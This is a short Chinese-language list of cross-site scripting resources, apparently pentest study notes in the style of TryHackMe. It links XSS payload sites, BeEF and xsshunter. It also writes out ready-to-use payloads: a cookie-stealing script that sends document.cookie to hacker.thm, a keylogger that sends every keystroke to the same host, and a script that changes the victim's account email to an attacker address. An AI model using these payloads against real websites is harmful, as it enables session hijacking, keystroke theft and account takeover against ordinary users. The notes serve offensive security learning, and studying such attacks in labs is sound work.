# 资源

## 服务器信息

* [端口扫描](http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) 一个迷你的本地端口扫描器
* [XSS-Payloads-com](http://www.xss-payloads.com/) 一个 XSS Payload 网站

## 用户信息获取

* BeFF XSS 渗透测试工具
*   会话窃取

    ```javascript
    <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
    ```
*   按键记录器

    * [XSS Keylogger](http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) 记录用户的所有击键

    ```javascript
    <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
    ```
*   逻辑 `修改用户邮箱`

    ```javascript
    <script>user.changeEmail('attacker@hacker.thm');</script>
    ```
* Bind XSS
  * [xsshunter](https://xsshunter.com/) Bind XSS 攻击工具，自动获取 COOKIE 、URL、页面内容

## 综合工具

* [XSS-Payloads-com](http://www.xss-payloads.com/) 一个 XSS Payload 网站
* BeFF XSS 渗透测试工具
